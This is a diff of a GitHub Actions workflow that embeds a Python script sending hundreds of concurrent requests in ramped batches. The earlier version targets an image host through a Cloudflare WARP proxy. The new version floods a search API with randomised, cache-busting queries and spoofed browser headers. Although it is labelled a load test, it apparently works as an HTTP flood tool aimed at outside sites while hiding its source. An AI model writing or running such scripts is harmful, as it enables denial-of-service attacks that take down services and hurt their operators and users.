@@ -14,32 +14,8 @@ jobs:
         with:
           python-version: '3.11'
 
-      - name: Install and Setup Cloudflare WARP (Proxy Mode)
-        run: |
-          # 1. Add Cloudflare's GPG key and APT repository
-          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
-          echo "deb [signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
-          
-          # 2. Update and Install Cloudflare WARP
-          sudo apt-get update
-          sudo apt-get install cloudflare-warp -y
-          
-          # 3. Register a new device, set to proxy mode, and connect
-          warp-cli --accept-tos registration new
-          warp-cli --accept-tos mode proxy
-          warp-cli --accept-tos connect
-          
-          # 4. Wait a few seconds for the WARP connection to successfully establish
-          echo "Waiting for WARP connection to establish..."
-          sleep 10
-          
-          # 5. Verify the proxy is working (WARP proxy runs locally on SOCKS5 port 40000)
-          echo "Verifying WARP Proxy connection:"
-          curl -s --socks5 127.0.0.1:40000 https://cloudflare.com/cdn-cgi/trace | grep warp
-
       - name: Install Dependencies
-        # Added aiohttp_socks so aiohttp can route traffic through the SOCKS5 proxy
-        run: pip install aiohttp tqdm aiohttp_socks
+        run: pip install aiohttp tqdm
 
       - name: Execute Embedded Python Script
         run: |
@@ -48,19 +24,13 @@ jobs:
           import aiohttp
           import os
           import logging
+          import random
+          import string
           from tqdm.asyncio import tqdm
           from asyncio import Semaphore
-          from aiohttp_socks import ProxyConnector
 
           # ---------------- CONFIGURATION ---------------- #
-          URLS = [
-              "https://media.moctale.in/images/daeb163f-9938-43e8-b0d3-8e4c8b465767.jpg",
-              "https://media.moctale.in/images/c2040913-e307-4ac4-aada-eba8329b8320.jpg",
-              "https://media.moctale.in/images/3fe14723-fe15-45cc-ba21-27378e1afaa5.jpg",
-              "https://media.moctale.in/images/79ebbc3a-008a-4759-9ced-94acddb415ec.jpg",
-              "https://media.moctale.in/images/6862665a-66b9-410c-87bc-ceb7a78bc6d5.jpg",
-              "https://media.moctale.in/images/86ca87b2-31c5-46bf-938d-2652f3adddde.jpg"
-          ]
+          TARGET_URL = "https://www.myexamplesite.app/api/convex-proxy"
 
           # --- Load Test Parameters ---
           CONCURRENCY_LIMIT = 500  # Max number of concurrent requests
@@ -71,14 +41,15 @@ jobs:
 
 
           HEADERS = {
-              "Host": "media.moctale.in",
+              "Host": "www.myexamplesite.app",
+              "Content-Type": "application/json",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-              "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
-              "Sec-Fetch-Site": "same-site",
-              "Sec-Fetch-Mode": "no-cors",
-              "Sec-Fetch-Dest": "image",
-              "Referer": "https://moctale.in/",
-              "Priority": "0"
+              "Accept": "*/*",
+              "Origin": "https://myexamplesite.app",
+              "Sec-Fetch-Site": "same-origin",
+              "Sec-Fetch-Mode": "cors",
+              "Referer": "https://www.myexamplesite.app",
+              "Priority": "u=0"
           }
 
           # ---------------- LOGGING SETUP ---------------- #
@@ -89,10 +60,24 @@ jobs:
 
           # ---------------- WORKER FUNCTION ---------------- #
           async def fetch_url(url, session, semaphore):
+              # Generate a random 2-letter alphanumeric string for the query
+              random_query = ''.join(random.choices(string.ascii_letters + string.digits, k=2))
+              
+              # Construct the unique payload for this request
+              payload = {
+                  "fn": "publicReadActions:loomsSearch",
+                  "args": {
+                      "query": random_query,
+                      "limit": 1000,
+                      "throttleToken": "proxy"
+                  },
+                  "type": "action"
+              }
+
               # Wait for a free slot from the semaphore
               async with semaphore:
                   try:
-                      async with session.get(url, headers=HEADERS) as response:
+                      async with session.post(url, headers=HEADERS, json=payload) as response:
                           await response.read()
                           if response.status != 200:
                               logging.warning(f"URL: {url} - Received status code: {response.status}")
@@ -109,13 +94,13 @@ jobs:
 
           # ---------------- MAIN EXECUTOR ---------------- #
           async def main():
-              print("Starting aggressive load test via Cloudflare WARP proxy...")
+              print("Starting aggressive load test with concurrency limiting and ramp-up...")
               print(f"Configuration: {CONCURRENCY_LIMIT} concurrent requests, ramping up {REQUESTS_PER_BATCH} reqs/{BATCH_DELAY_SECONDS}s.")
 
-              # Route all traffic through the Cloudflare WARP local SOCKS5 proxy
-              connector = ProxyConnector.from_url(
-                  'socks5://127.0.0.1:40000',
+              connector = aiohttp.TCPConnector(
                   limit=0, # Let the semaphore handle connection limiting
+                  limit_per_host=0,
+                  ttl_dns_cache=300,
                   ssl=False,
                   force_close=False,
                   enable_cleanup_closed=True
@@ -143,12 +128,12 @@ jobs:
                       batch_tasks = [
                           asyncio.create_task(
                               fetch_url(
-                                  URLS[j % len(URLS)],
+                                  TARGET_URL,
                                   session,
                                   semaphore
                               )
                           )
-                          for j in range(REQUESTS_PER_BATCH)
+                          for _ in range(REQUESTS_PER_BATCH)
                       ]
                       all_tasks.extend(batch_tasks)
                       
